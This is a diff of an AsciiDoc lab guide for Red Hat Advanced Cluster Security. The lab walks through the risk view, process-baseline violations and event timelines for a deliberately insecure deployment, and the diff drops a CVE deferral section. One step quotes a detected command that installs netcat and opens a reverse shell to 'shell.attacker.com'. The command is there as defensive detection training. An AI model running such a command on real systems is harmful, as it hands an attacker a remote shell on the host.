@@ -108,87 +108,80 @@ In this section, you look at the complete view of the risks by deployments in al
 This list view shows all deployments in all clusters and namespaces, ordered by risk priority. A multi-factor risk metric sorts deployments based on policy violations, image contents, deployment configuration, and other similar factors. Deployments at the top of the list present the most risk.
 
 *Procedure*
+
 . From the left navigation menu, select the *Risk* tab:
-
++
 image::03-risk-01.png[link=self, window=blank, width=100%]
-
-[start=2]
++
 . Click the `visa-processor` deployment to bring up the *Risk Details* panel, with the *Risk Indicators* tab selected:
-
++
 image::03-risk-02.png[link=self, window=blank, width=100%]
-
++
 The *Risk Indicators* tab shows why this deployment is highly risky. The deployment has serious, fixable vulnerabilities, but it also has configurations such as service exposure outside the cluster, making it more likely to be attacked. In addition, other configurations, such as privileged containers, mean that a successful attacker has access to the underlying host network and file system, including other containers running on that host.
-
++
 > What is the *"Riskiest deployment"*? Why do you think it was rated that way?
-
-[start=3]
++
 . Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section:
-
++
 image::03-risk-03.png[link=self, window=blank, width=100%]
-
++
 NOTE: The configuration details are automatically pulled by RHACS from OpenShift and Kubernetes distributions. A risk score is applied to each factor, making the risk report immediately available as soon as you start running RHACS.
-
++
 This "visa-processor" image is highly insecure in the service configuration section. The container has:
-
++
 * SYS_ADMIN capabilities
 * Port 22 is exposed in an unknown manner
 * Components such as app, bash, curl, and wget are available
 * Apache Struts is present in the image
-
++
 This means that if successful, the attacker will have significant control over the system.
-
-[start=4]
++
 . Navigate to the deployment details:
-
++
 image::03-risk-04.png[link=self, window=blank, width=100%]
-
++
 Here, we see a complete breakdown of the deployment details, including the container configuration, the mounted secrets, the image name, specific commands, and the security context of the container, which is privileged.
-
++
 The deployment details help you understand who and what is responsible for this workload. 
-
-[start=5]
++
 . Next, click on the *Process Discovery* Tab:
-
++
 image::03-risk-05.png[link=self, window=blank, width=100%]
-
++
 This tab displays all the running processes in the container. You can see that a baseline of processes has already been established, and a few violations of that baseline have been detected. The baseline is a list of the processes currently running, and alerts are triggered if RHACS detects new processes not included in the baseline.
-
++
 If you scroll to the bottom of the page, you can remove these processes from the baseline by clicking the - sign. Once locked in, you can craft alerts for anomalies and non-baseline activity. 
-
-[start=6]
++
 . Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation:
-
++
 image::03-risk-06.png[link=self, window=blank, width=100%]
-
-[start=7]
++
 . Review the command:
-
++
 `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
-
++
 > Does this qualify as anomalous behavior? Is this behavior normal in a container?
-
-[start=8]
++
 . Click the *View Graph* in the header bar to call up the *Event Timeline*:
-
++
 image::03-risk-07.png[link=self, window=blank, width=100%]
-
++
 image::03-risk-08.png[link=self, window=blank, width=100%]
-
++
 The event timeline shows for each pod the process activity that has occurred over time. It has the visa-processor and visa-processor-sidecar information in the interface.
-
-[start=9]
++
 . Click the squares or circles for the process activity:
-
++
 image::03-risk-07.png[link=self, window=blank, width=100%]
++
 image::03-risk-08.png[link=self, window=blank, width=100%]
-
++
 While RHACS monitored baseline activity, it detected a few policy violations from the container. 
-
-[start=10]
++
 . Click the blue dot to view the flagged issues:
-
++
 image::03-risk-09.png[link=self, window=blank, width=100%]
-
++
 > Here, the netcat command was run well after container startup and a Shell Spawned by Java Application policy was violated. These actions should yield a response.
 
 == Find and Create Policies Quickly with Filters
@@ -278,62 +271,13 @@ Search for the deployments in the `default` and `patient-portal` namespace:
 
 image::03-risk-13.png[link=self, window=blank, width=100%]
 
-See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risks.html[Understanding the filtering criteria into policy criteria^] documentation for more information.
+See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risks.html[understanding the filtering criteria into policy criteria^] documentation for more information.
 
 == What Would You Do?
 
 * What filters would be useful in your day-to-day risk workflow? 
 * How would you scope your filters by team/application/cluster?
-
-== Risk Acceptance Workflow
-
-As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal. In this section, we will review a deferral process in RHACS.
-
-*Procedure*
-. Head to the Vulnerability Management -> Results:
-
-image::03-risk-14.png[link=self, window=blank, width=100%]
-
-[start=2]
-. Select any vulnerability that you want to defer. Click the 3 dots on the right-hand side of the tab -> select `Defer CVE`:
-. Pick a timeline for deferral by selecting "14 days":
-. Give the deferral a rationale:
-. Click "Submit request":
-
-image::03-risk-15.png[link=self, window=blank, width=100%]
-
-> The output gives you all of the investigation information, including a link that you can send out to teammates who can review your investigation. 
-
-image::03-risk-16.png[link=self, window=blank, width=100%]
-
-====
-There will be a "Pending Exception" icon in the dashboard to mark that a deferral has been requested.
-====
-
-[start=6]
-. Click on the *Pending exception* icon:
-
-image::03-risk-17.png[link=self, window=blank, width=100%]
-
-> You should be brought to the *Exception Management* page. Here is where you, and others, can find all of the information about the vulnerability deferral. 
-
-image::03-risk-18.png[link=self, window=blank, width=100%]
-
-[start=7]
-. Decide how you want to handle the deferral by clicking your newly created request and selecting an option: 
-
-image::03-risk-19.png[link=self, window=blank, width=100%]
-
-The *Exception Management* page will show all pending vulnerability-related requests.
-
-IMPORTANT: While you can mute notifications or a CVE, you can never hide them in RHACS. 
-
-== What Would You Do?
-
-- How does your organization manage security policies? 
-- How will you use this dashboard to review your security posture?
-- What types of security configuration controls are you putting in place in your OpenShift and Kubernetes Clusters?
-- How would you make changes to your clusters?
+* What types of security configuration controls are you putting in place in your OpenShift and Kubernetes Clusters?
 
 == Summary
 
